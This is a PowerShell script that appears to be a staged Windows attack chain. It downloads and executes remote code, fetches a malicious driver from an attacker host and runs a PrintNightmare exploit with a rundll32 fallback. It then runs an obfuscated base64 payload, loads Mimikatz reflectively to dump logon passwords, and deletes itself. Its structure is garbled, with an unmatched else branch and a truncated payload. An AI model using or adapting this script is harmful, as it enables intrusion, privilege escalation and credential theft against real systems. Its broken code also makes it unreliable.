# === INITIAL DROPPER EXECUTION ===
Write-Host "This script has been downloaded from a remote server and is executing..."

# Get system locale and culture
$hostinfo = Get-Host
$lang = $hostinfo.CurrentCulture.DisplayName

Write-Host "Current system language: $lang"

# === DOWNLOAD NEXT STAGE PAYLOAD ===
$downloader = New-Object System.Net.WebClient
$downloadedScript = $downloader.DownloadString("https://raw.githubusercontent.com/tww-software/powershell-dropper-POC/master/downloadandexecute.ps1")
Invoke-Expression $downloadedScript

# === STAGE 2: FILELESS PrintNightmare Payload ===
$remoteShare = "\\attacker-host\printpayloads"
$driverName = "PrintSpooferDriver"
$dllName = "malicious.dll"
$printerEnv = "Windows x64"

# Path for the malicious pplk.sys driver
$pplkDriverPath = "C:\Windows\System32\drivers\pplk.sys"

# Download and drop the malicious driver (pplk.sys)
Write-Host "[*] Downloading malicious pplk.sys driver..."
$downloader.DownloadFile("https://attacker-host.com/payloads/pplk.sys", $pplkDriverPath)

# Set permissions to ensure the driver can be loaded
Write-Host "[*] Setting appropriate permissions for pplk.sys..."
icacls $pplkDriverPath /grant "Everyone:F"

# === Install PrintNightmare Exploit ===
$DRIVER_INFO_2 = @{
    cVersion        = 3
    pName           = $driverName
    pEnvironment    = $printerEnv
    pDriverPath     = "$remoteShare\UNUSED.DLL"
    pDataFile       = "$remoteShare\$dllName"
    pConfigFile     = "$remoteShare\$dllName"
}

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class PrintNightmare {
    [DllImport("winspool.drv", EntryPoint="AddPrinterDriverExW", SetLastError=true)]
    public static extern bool AddPrinterDriverExW(
        string pName,
        UInt32 Level,
        ref DRIVER_INFO_2 pDriverInfo,
        UInt32 dwFileCopyFlags
    );

    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct DRIVER_INFO_2 {
        public UInt32 cVersion;
        public string pName;
        public string pEnvironment;
        public string pDriverPath;
        public string pDataFile;
        public string pConfigFile;
    }
}
"@ -Language CSharpVersion3

$driverStruct = New-Object PrintNightmare+DRIVER_INFO_2
$driverStruct.cVersion = $DRIVER_INFO_2["cVersion"]
$driverStruct.pName = $DRIVER_INFO_2["pName"]
$driverStruct.pEnvironment = $DRIVER_INFO_2["pEnvironment"]
$driverStruct.pDriverPath = $DRIVER_INFO_2["pDriverPath"]
$driverStruct.pDataFile = $DRIVER_INFO_2["pDataFile"]
$driverStruct.pConfigFile = $DRIVER_INFO_2["pConfigFile"]

Write-Host "[*] Attempting PrintNightmare exploit..."
$result = [PrintNightmare]::AddPrinterDriverExW($null, 2, [ref]$driverStruct, 0x00000010)

if ($result) {
    Write-Host "[+] PrintNightmare executed successfully."
} else {
    Write-Host "[-] PrintNightmare failed. Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    Write-Host "[*] Switching to SpoolerFooler fallback..."

    # === STAGE 2b: SpoolerFooler Trigger ===
    $printerName = "SpoolerFooler"
    $spoolShare = "\\attacker-host\payload"

    Add-Printer -Name $printerName -DriverName "Generic / Text Only" -PortName $spoolShare
    Set-Printer -Name $printerName -Shared $true -Published $true
    Start-Sleep -Seconds 2
    Write-Host "[*] Triggering job via printer..."
    Start-Process "rundll32.exe" "$spoolShare\evil.dll,SpoolerTrigger"

    Write-Host "[+] SpoolerFooler attempt completed."
}

# === STAGE 3: OBFUSCATED PAYLOAD (Optional logic gate) ===
$t1 = "JAAxADIAMwAxACAAPQAgAEcAZQBUAC0ASABvAHMAdAA7ACAAJAA0ADIAMgAxACAAPQAgACQAMQAyADMAMQAuAEMAdQByAHIAZQBuAHQAQwB1AGwAdAB1AHIAZQAuAEQAaQBzAHAAbA..."
$t2 = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($t1))
$t3 = "noiSSerpxE-eKOvNI"
$t4 = ([regex]::Matches($t3, '.', 'RightToLeft') | ForEach {$_.value}) -join ''
&($t4) $t2

Write-Host "[*] Execution sequence completed."

# === STAGE 4: LOADING MIMIKATZ REFLECTIVELY INTO MEMORY ===
Write-Host "[*] Preparing to load Mimikatz reflectively..."
$MimikatzUrl = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1"
$MimikatzScript = (New-Object Net.WebClient).DownloadString($MimikatzUrl)

# Wait for memory context to stabilize
Start-Sleep -Milliseconds 500

# Reflectively execute Mimikatz commands
Write-Host "[*] Invoking Mimikatz for credential dumping..."
Invoke-Expression $MimikatzScript
Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'
Write-Host "[+] Mimikatz execution completed."

# === Fallback Option: Using cmdkey for credential management ===
Write-Host "[*] Attempting to create a new credential using cmdkey..."
cmdkey /add:"attacker-host" /user:"attacker" /pass:"attacker_password"

Write-Host "[+] Credential created using cmdkey."

# === Fallback Option: Runas Command for Privilege Escalation ===
Write-Host "[*] Attempting to escalate privileges using runas command..."
Start-Process "runas" -ArgumentList "/user:administrator cmd"

Write-Host "[+] Runas executed."

# === Fallback Option: Netsh Command for Networking Enumeration ===
Write-Host "[*] Attempting to use netsh for network configuration and discovery..."
Start-Process "netsh" -ArgumentList "interface show interface"

Write-Host "[+] Netsh executed for network discovery."

# === Fallback Option: Net Command for Internal Discovery ===
Write-Host "[*] Attempting to use net command for internal discovery..."
Start-Process "net" -ArgumentList "stat"

Write-Host "[+] Net command executed for internal discovery."

} else {
    Write-Host "[-] Language mismatch — removing script."
    Remove-Item $PSCommandPath -Force
}

# Set PowerShell to quiet mode
$ErrorActionPreference = "SilentlyContinue"
